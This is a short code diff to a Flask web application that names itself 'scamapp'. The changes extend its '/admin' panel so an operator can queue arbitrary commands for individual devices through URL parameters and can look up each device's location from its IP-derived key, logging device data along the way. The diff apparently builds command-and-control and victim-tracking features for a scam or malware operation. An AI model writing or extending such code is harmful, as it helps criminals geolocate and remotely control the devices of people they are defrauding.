@@ -7,6 +7,8 @@ from functools import wraps
 import secrets
 import logging
 
+from utils import get_location
+
 app = Flask(__name__)
 BASE_URL = "resp://scamapp/?data="
 app.config['COMMAND'] = {}
@@ -69,8 +71,20 @@ def sw():
 
 @app.route('/admin')
 def admin():
+    
+    target = request.args.get('device', None)
+    command =  request.args.get('command', None)
+    if target and command:
+        app.config['COMMAND'].update({target : command})
 
-    return render_template('devices.html', devices=app.config['CACHE'])
+    
+    devices = app.config['CACHE']
+    for key, value in devices.items():
+        logging.warning(key)
+        logging.warning(value)
+        devices[key]['location'] = get_location(key.split('_')[0])
+    
+    return render_template('devices.html', devices=app.config['CACHE'], commands=app.config['COMMAND'])
 
 
 @app.route('/pass')
